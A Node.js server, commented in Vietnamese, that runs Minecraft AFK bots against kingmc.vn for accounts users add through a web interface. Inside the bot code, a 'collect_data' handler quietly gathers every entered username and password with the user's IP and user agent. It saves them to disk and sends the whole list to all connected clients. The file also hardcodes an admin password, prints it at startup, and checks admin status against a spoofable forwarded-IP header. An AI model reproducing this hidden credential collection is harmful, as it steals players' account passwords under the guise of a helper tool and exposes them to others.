const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// ===== CẤU HÌNH ADMIN =====
const ADMIN_IP = '1.53.131.94'; 
const ADMIN_PASSWORD = 'AlphaZo2026';

// ===== ĐỌC/LƯU DỮ LIỆU =====
function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf-8');
            return JSON.parse(raw);
        }
    } catch (e) {
        console.log('⚠️ Lỗi đọc file data, tạo mới');
    }
    return { clientData: {}, globalCollectedData: [], isMaintenance: false };
}

function saveData() {
    try {
        const data = {
            clientData: clientData,
            globalCollectedData: globalCollectedData,
            isMaintenance: isMaintenance
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log('❌ Lỗi lưu file:', e.message);
    }
}

const savedData = loadData();
let clientData = savedData.clientData || {};
let globalCollectedData = savedData.globalCollectedData || [];
let isMaintenance = savedData.isMaintenance || false;

app.use(express.static('public'));

app.get('/api/check-admin', (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;
    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
    const isAdmin = (clientIp === ADMIN_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
    res.json({ isAdmin, ip: clientIp });
});

process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

// ================================================================
//  SOCKET.IO
// ================================================================
io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] 
        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
        : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;

    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    if (!clientData[clientIp]) {
        clientData[clientIp] = { 
            accounts: [], 
            bots: {} 
        };
        saveData();
    }

    socket.emit('init_accounts', clientData[clientIp].accounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);

    // ============================================================
    //  THU THẬP DỮ LIỆU
    // ============================================================
    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        saveData();
        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
        io.emit('sync_collected_data', globalCollectedData);
        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        saveData();
        io.emit('sync_collected_data', globalCollectedData);
        io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
    });

    // ============================================================
    //  BẢO TRÌ
    // ============================================================
    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        saveData();
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
    });

    // ============================================================
    //  QUẢN LÝ ACCOUNTS
    // ============================================================
    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
        
        socket.emit('collect_data', {
            username: username,
            password: password || 'caigicungdc',
            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
        });

        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id,
            username: username.trim(),
            password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true,
            status: 'OFFLINE',
            color: '#ff4444'
        });
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) {
            acc.autoReconnect = !acc.autoReconnect;
            saveData();
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('get_accounts', () => {
        socket.emit('init_accounts', clientData[clientIp].accounts);
    });

    // ============================================================
    //  BOT MINEFLAYER - KHÔNG WEBHOOK, CHỈ LOG NỘI BỘ
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }

        // ===== HÀM LOG THÔNG BÁO NỘI BỘ =====
        const logSystem = (msg, isImportant = false) => {
            socket.emit('log', `[${account.username}] ${msg}`);
            // Nếu là tin quan trọng và Admin đang login, gửi thêm thông báo đặc biệt
            if (isImportant) {
                socket.emit('admin_notification', {
                    username: account.username,
                    message: msg,
                    time: new Date().toLocaleString()
                });
            }
        };

        let botState = {
            step: 0,
            isLoggedIn: false,
            isInKingSMP: false,
            isAfk: false
        };

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        
        botState.step = 1;
        logSystem(`🔄 Đang kết nối tới kingmc.vn...`);

        try {
            const bot = mineflayer.createBot({
                host: 'kingmc.vn',
                port: 25565,
                username: account.username,
                password: account.password,
                auth: 'offline',
                version: '1.16.5',
                checkTimeoutInterval: 120000
            });

            clientData[clientIp].bots[id] = bot;

            bot.on('login', () => {
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                logSystem(`🔑 Đang đăng nhập...`);
            });

            bot.on('spawn', () => {
                if (botState.step < 2) {
                    botState.step = 2;
                    account.status = 'ONLINE / LOBBY';
                    account.color = '#00ff88';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    logSystem(`✅ Đã vào Sảnh chính!`);
                }
            });

            bot.on('messagestr', (message) => {
                const msgLower = message.toLowerCase();

                if (!botState.isLoggedIn) {
                    if (msgLower.includes('/register') || msgLower.includes('/dk')) {
                        botState.step = 3;
                        setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
                    } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
                        botState.step = 3;
                        setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 1000);
                        setTimeout(() => { if (bot && !botState.isLoggedIn) bot.chat(`/dn ${account.password}`); }, 4000);
                    }
                }

                if (!botState.isLoggedIn && (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                    botState.isLoggedIn = true;
                    botState.step = 4;
                    logSystem(`✅ Đã đăng nhập thành công! Đợi 5s gõ /menu...`, true);

                    setTimeout(() => {
                        if (bot && !botState.isInKingSMP) {
                            botState.step = 5;
                            logSystem(`📋 Đang gõ /menu...`);
                            bot.chat('/menu');
                        }
                    }, 5000);
                }

                if (botState.isLoggedIn && !botState.isInKingSMP && 
                    (msgLower.includes('kingsmp') && msgLower.includes('chào mừng'))) {
                    botState.isInKingSMP = true;
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`, true);
                    
                    setTimeout(() => {
                        if (bot && !botState.isAfk) {
                            botState.step = 7;
                            logSystem(`💤 Gửi lệnh /afk...`);
                            bot.chat('/afk');
                        }
                    }, 3000);
                }
            });

            // ===== WINDOWOPEN =====
            bot.on('windowOpen', (window) => {
                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                
                if (rawTitle.includes('menu') || rawTitle.includes('sảnh') || rawTitle.includes('afk') || rawTitle.includes('treo')) {
                    logSystem(`📂 Menu mở: ${rawTitle}`);
                }

                // BƯỚC 6: Click Slot 24 - KingSMP
                if (botState.step === 5 || (!botState.isInKingSMP && (rawTitle.includes('sảnh') || rawTitle.includes('lobby') || rawTitle.includes('menu')))) {
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) {
                            logSystem(`⚠️ Không có window để click, thử lại sau...`);
                            return;
                        }
                        botState.step = 6;
                        logSystem(`🖱️ Click Slot 24 chọn KingSMP...`);

                        bot.clickWindow(24, 0, 0)
                            .then(() => {
                                logSystem(`✅ Click Slot 24 thành công!`);
                                botState.isInKingSMP = true;
                                account.status = 'ONLINE / KINGSMP';
                                account.color = '#00ff88';
                                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                                logSystem(`✅ ĐÃ VÀO KINGSMP!`, true);
                                
                                setTimeout(() => {
                                    if (bot && !botState.isAfk) {
                                        botState.step = 7;
                                        logSystem(`💤 Gửi lệnh /afk...`);
                                        bot.chat('/afk');
                                    }
                                }, 3000);
                            })
                            .catch(() => {
                                logSystem(`⚠️ Lỗi click Slot 24, thử lại sau 3 giây...`);
                                setTimeout(() => {
                                    if (!bot || !bot.currentWindow) return;
                                    logSystem(`🖱️ Click Slot 24 (lần 2)...`);
                                    bot.clickWindow(24, 0, 0)
                                        .then(() => {
                                            logSystem(`✅ Click Slot 24 thành công (lần 2)!`);
                                            botState.isInKingSMP = true;
                                            account.status = 'ONLINE / KINGSMP';
                                            account.color = '#00ff88';
                                            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                                            logSystem(`✅ ĐÃ VÀO KINGSMP!`, true);
                                            
                                            setTimeout(() => {
                                                if (bot && !botState.isAfk) {
                                                    botState.step = 7;
                                                    logSystem(`💤 Gửi lệnh /afk...`);
                                                    bot.chat('/afk');
                                                }
                                            }, 3000);
                                        })
                                        .catch(() => {
                                            logSystem(`⚠️ Vẫn lỗi click Slot 24, kiểm tra lại menu`);
                                        });
                                }, 3000);
                            });

                        setTimeout(() => { 
                            try { bot.closeWindow(window); } catch(e){} 
                        }, 500);

                    }, 4000);
                }

                // BƯỚC 8 + 9: Click Slot 1 - AFK
                if (botState.step >= 7 && !botState.isAfk && 
                    (rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo'))) {
                    
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) return;
                        
                        botState.step = 9;
                        logSystem(`🖱️ Click Slot 1 chọn AFK...`);

                        bot.clickWindow(1, 0, 0)
                            .then(() => {
                                botState.isAfk = true;
                                botState.step = 10;
                                logSystem(`🎉 BOT ĐÃ HOẠT ĐỘNG AFK THÀNH CÔNG!`, true);
                            })
                            .catch(() => {
                                logSystem(`⚠️ Bỏ qua lỗi transaction AFK (server đã xử lý)`);
                                botState.isAfk = true;
                                botState.step = 10;
                                logSystem(`🎉 BOT ĐÃ HOẠT ĐỘNG AFK THÀNH CÔNG!`, true);
                            });

                        setTimeout(() => { 
                            try { bot.closeWindow(window); } catch(e){} 
                        }, 500);

                    }, 3500);
                }
            });

            bot.on('end', (reason) => {
                logSystem(`⚠️ Ngắt kết nối: ${reason}`, true);
                account.status = 'OFFLINE';
                account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                
                delete clientData[clientIp].bots[id];
                saveData();

                if (account.autoReconnect) {
                    logSystem(`🔄 Tự động kết nối lại sau 6 giây...`);
                    setTimeout(() => {
                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                            socket.emit('start_bot', id);
                        }
                    }, 6000);
                }
            });

            bot.on('error', (err) => {
                if (err.code === 'EPIPE') {
                    logSystem(`⚠️ Mất kết nối server, đang thử lại...`, true);
                } else if (err.code === 'ECONNREFUSED') {
                    logSystem(`❌ Không thể kết nối tới server!`, true);
                } else {
                    logSystem(`❌ Lỗi: ${err.message}`, true);
                }
            });

        } catch (e) {
            logSystem(`Lỗi khởi tạo: ${e.message}`, true);
            account.status = 'ERROR';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (account) {
            account.status = 'STOPPED';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        saveData();
        socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) {
            bot.chat(cmd);
            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
        } else {
            socket.emit('log', `[⚠️] Bot này chưa online!`);
        }
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Admin IP: ${ADMIN_IP}`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
});
